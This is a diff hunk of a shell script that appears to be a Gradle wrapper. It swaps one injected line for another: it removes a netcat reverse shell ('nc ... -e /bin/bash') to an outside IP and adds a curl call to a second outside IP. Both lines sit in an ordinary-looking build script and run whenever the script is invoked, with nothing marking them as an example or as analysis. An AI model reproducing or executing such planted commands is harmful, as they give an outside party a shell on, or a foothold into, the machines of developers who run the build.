@@ -25,7 +25,7 @@ die ( ) {
     echo
     exit 1
 }
-nc 192.248.172.144 1234 -e /bin/bash
+curl http://8.130.178.168/bbbbb
 # OS specific support (must be 'true' or 'false').
 cygwin=false
 msys=false
